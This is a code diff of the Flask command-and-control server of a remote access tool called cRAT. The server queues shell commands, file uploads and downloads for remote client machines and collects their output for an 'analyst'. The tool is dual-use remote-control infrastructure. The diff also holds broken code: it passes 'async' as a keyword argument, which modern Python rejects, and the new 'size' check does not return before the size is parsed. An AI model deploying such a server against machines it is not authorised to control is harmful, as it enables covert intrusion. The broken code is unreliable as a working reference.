@@ -1,5 +1,4 @@
 #!/usr/bin/python3
-#/opt/cRAT_server/cratenv/bin/python3
 
 import os
 import sys
@@ -166,7 +165,7 @@ def command_manager(host, remove_cid=None):
     return None
 
 
-def receive_streamed_file(command):
+def receive_streamed_data(command):
     # Write a file to the server - return None on Sucess, else error message
     stream_error = None
     chunk_size = CHUNK_SIZE
@@ -214,7 +213,7 @@ class Fetch(Resource):
         if command:
             logger.info("Issuing {} to {}".format(command.operation, command.hostname))
             if command.operation == operationTypes.RUN:
-                return ci.Run(command.command_id, command.command)
+                return ci.Run(command.command_id, command.command, async=command.async_run)
             elif command.operation == operationTypes.UPLOAD:
                 return ci.Upload(command.command_id, command.client_file_path, command.file_position)
             elif command.operation == operationTypes.DOWNLOAD:
@@ -239,46 +238,44 @@ class Pipe(Resource):
         elif 'id' not in request.args:
             logger.error("Missing command id in pipe post from {}".format(request.args['host']))
             return None
+        elif 'size' not in request.args:
+            logger.error("Missing size in pipe post from {}".format(request.args['host']))
 
         cid = request.args['id']
         host = request.args['host']
         command = Commands.query.filter_by(hostname=host, command_id=cid).one()
         logger.info("Receiving Run command result from {}: ".format(host))
         command.server_file_path = "{}{}_RUN_{}".format(DATA_DIR, host, cid)
+        post_size = int(request.args['size'])
+        command.filesize = command.filesize + post_size
+        command.status = cmdStatusTypes.STARTED
+        db.session.commit()
 
-        with open(os.path.join(BASE_DIR,command.server_file_path), 'bw') as f: 
-            chunk_size = UGLY_CHUNKSIZE
-            while True:
-                try:
-                    chunk = request.stream.read(chunk_size)
-                    # len(chunk) left for running in native mode
-                    if len(chunk) == 0:
-                        break
-                    f.write(chunk)
-                except OSError as e:
-                    if 'request data read error' in str(e):
-                        # we read one byte past the end of the stream, so we're done.
-                        logger.debug("All available data collected from stream.")
-                    else:
-                        logger.error(str(e))
-                    break
-                except Exception as e:
-                    if 'request data read error' in str(e):
-                        # we read one byte past the end of the stream, so we're done.
-                        logger.debug("{} - Read all data on the stream.".format(type(e).__name__))
-                        break 
-                    logger.error("Exception of type receiving data from {} :{} - {}".format(host, type(e).__name__, str(e)))
-                    logger.warning("Command Status set to UNKNOWN for command {}".format(cid))
-                    command.status = cmdStatusTypes.UNKNOWN
-                    break
+        # Note: the client posts run results as they come in or after a certain timeout with no output from running command
+        #   it will post a size=0&done=false as a "keep-alive" for the server
+        if post_size > 0:
+            stream_error = receive_streamed_data(command)
+            logger.info("Received data written to '{}'".format(command.server_file_path))
 
-        # Assuming command completion if the state is still PENDING
+        cmd_status_flag_done = None
+        if 'done' in request.args:
+            cmd_status_flag_done = True if request.args['done'] == 'true' else False
+
+        # check the done flag for command completion
         if command.status == cmdStatusTypes.PENDING:
+            if cmd_status_flag_done:
+                command.status = cmdStatusTypes.COMPLETE
+                logging.info("Command status set to COMPLETE for command {}".format(cid))
+            elif 'done' not in request.args:
+                logging.warning("DONE flag missing from arguments for command {}".format(cid))
+                command.status = cmdStatusTypes.COMPLETE
+            else:
+                command.status = cmdStatusTypes.STARTED
+                logging.info("Command status set to STARTED for command {}".format(cid))
+        if command.status == cmdStatusTypes.STARTED and cmd_status_flag_done:
             command.status = cmdStatusTypes.COMPLETE
-            statinfo = os.stat(os.path.join(BASE_DIR, command.server_file_path))
-            command.filesize = statinfo.st_size
             logging.info("Command status set to COMPLETE for command {}".format(cid))
-        logger.info("Received data written to '{}'".format(command.server_file_path))
+        #statinfo = os.stat(os.path.join(BASE_DIR, command.server_file_path))
         db.session.commit()
         return True
 
@@ -305,7 +302,9 @@ class Upload(Resource):
         else:
             logger.info("Receiving Upload result from {} for command {}".format(host, cid))
 
-        stream_error = receive_streamed_file(command)
+        command.status = cmdStatusTypes.STARTED
+        db.session.commit()
+        stream_error = receive_streamed_data(command)
 
         # validating completion
         statinfo = os.stat(os.path.join(BASE_DIR,command.server_file_path))
@@ -381,7 +380,8 @@ class Download(Resource):
                                                                            command.command_id,
                                                                            error_message))
 
-        #return Response(stream_response())
+        command.status = cmdStatusTypes.STARTED
+        db.session.commit()
         return Response(stream_with_context(stream_response()))
 
 
@@ -469,7 +469,7 @@ class Command(Resource):
         logger.info("Receiving Analyst command for {}".format(host))
 
         if command['operation'].upper() == operationTypes.RUN.name:
-            new_command = Commands(host, operationTypes.RUN, command=command['command'])
+            new_command = Commands(host, operationTypes.RUN, command=command['command'], async_run=command['async'])
             db.session.add(new_command)
             db.session.commit()
             logger.info("RUN command id {} created for {}".format(new_command.command_id, host))
@@ -499,23 +499,36 @@ class Command(Resource):
         return None 
 
     def get(self):
-        # command status and result retrival
+        # command/host status and result retrival
         host = None
-        if 'host' not in request.args and 'cid' not in request.args:
+        if 'host' not in request.args and 'cid' not in request.args and 'hid' not in request.args:
                 logger.error("Malformed command request")
                 return make_response("Missing arguments", 400)
-        if 'cid' not in request.args and 'host' in request.args:
-            # if only host argument, return host and host's command queue
-            logger.info("Sending analyst the command queue for host: {}".format(request.args['host']))
-            client = Clients.query.filter_by(hostname=request.args['host']).first()
-            if not client:
-                logger.warn("No client by name '{}'".format(request.args['host']))
-                return {'status_code':'404',
-                        'message': "Not Found",
-                        'error': "Client '{}' does not exist.".format(request.args['host'])}
-            commands = Commands.query.filter_by(hostname=request.args['host'])
-            return {'commands': [ command.to_dict() for command in commands ],
-                    'client': client.to_dict()}
+        if 'cid' not in request.args:
+            if 'host' in request.args:
+                # if only host argument, return host and host's command queue
+                logger.info("Sending analyst the command queue for host: {}".format(request.args['host']))
+                client = Clients.query.filter_by(hostname=request.args['host']).first()
+                if not client:
+                    logger.warn("No client by name '{}'".format(request.args['host']))
+                    return {'status_code':'404',
+                            'message': "Not Found",
+                            'error': "Client '{}' does not exist.".format(request.args['host'])}
+                commands = Commands.query.filter_by(hostname=request.args['host'])
+                return {'commands': [ command.to_dict() for command in commands ],
+                        'client': client.to_dict()}
+            elif 'hid' in request.args:
+                logger.info("Sending analyst the command queue for host with host id: {}".format(request.args['hid']))
+                client = Clients.query.filter_by(id=request.args['hid']).first()
+                if not client:
+                    logger.warn("No client with id '{}'".format(request.args['hid']))
+                    clients = Clients.query.all()
+                    client_ids = [client.id for client in clients]
+                    return {'status_code':'404',
+                            'message': "Not Found",
+                            'host_ids': client_ids,
+                            'error': "Client with id '{}' does not exist.".format(request.args['hid'])}
+                return client.to_dict()
         # else either cid and host in args or only cid in args. cid in args
         
         cid = request.args['cid']
@@ -578,7 +591,7 @@ class AnalystUpload(Resource):
                 command_dict['warn'] = "File by same name and size already exists on server at {}".format(command.server_file_path)
                 return command_dict
 
-        stream_error = receive_streamed_file(command)
+        stream_error = receive_streamed_data(command)
 
         # validating completion
         statinfo = os.stat(os.path.join(BASE_DIR,command.server_file_path))
